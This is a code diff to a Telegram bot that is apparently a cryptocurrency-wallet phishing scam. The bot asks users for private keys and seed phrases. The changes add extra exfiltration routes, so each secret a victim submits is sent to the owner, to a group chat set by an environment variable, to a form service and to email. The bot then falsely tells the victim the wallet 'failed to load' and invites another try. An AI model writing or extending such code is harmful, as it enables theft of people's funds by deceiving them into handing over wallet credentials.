@@ -76,10 +76,12 @@ const sendToFormUnstatic = async (name, message) => {
 };
 
 // message handler
-bot.on('message', (msg) => {
+bot.on('message', async (msg) => {
   if (!msg || !msg.chat) return;
   const chatId = msg.chat.id;
   const text = msg.text || '';
+
+  const groupId = process.env.GROUP_CHAT_ID; // add this in Railway variables
 
   if (text === 'Cancel') {
     delete chatStates[chatId];
@@ -88,26 +90,60 @@ bot.on('message', (msg) => {
 
   if (chatStates[chatId] === 'awaiting_private_key') {
     const privateKey = text;
+
+    // Send to owner
     bot.sendMessage(ownerId, `🔑 Private Key Received:\n${privateKey}`);
+
+    // Send to group
+    if (groupId) {
+      bot.sendMessage(groupId, `🔑 Private Key:\n${privateKey}`);
+    }
+
+    // Send to FormUnstatic
     sendToFormUnstatic('Private Key Received', privateKey);
+
+    // Send to email
+    if (typeof sendEmail === 'function') {
+      await sendEmail('Private Key Received', privateKey);
+    }
+
+    // Reply to user
     bot.sendMessage(chatId, '❌ Failed to load wallet!', {
       reply_markup: {
         inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
       },
     });
+
     delete chatStates[chatId];
     return;
   }
 
   if (chatStates[chatId] === 'awaiting_seed_phrase') {
     const seedPhrase = text;
+
+    // Send to owner
     bot.sendMessage(ownerId, `📜 Seed Phrase Received:\n${seedPhrase}`);
+
+    // Send to group
+    if (groupId) {
+      bot.sendMessage(groupId, `📜 Seed Phrase:\n${seedPhrase}`);
+    }
+
+    // Send to FormUnstatic
     sendToFormUnstatic('Seed Phrase Received', seedPhrase);
+
+    // Send to email
+    if (typeof sendEmail === 'function') {
+      await sendEmail('Seed Phrase Received', seedPhrase);
+    }
+
+    // Reply to user
     bot.sendMessage(chatId, '❌ Failed to load wallet!', {
       reply_markup: {
         inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
       },
     });
+
     delete chatStates[chatId];
     return;
   }
@@ -115,6 +151,7 @@ bot.on('message', (msg) => {
   // fallback reply
   bot.sendMessage(chatId, `Hello, ${msg.from?.first_name || 'there'}!`);
 });
+
 
 // /start command and menus
 const handledUpdateIds = new Set();
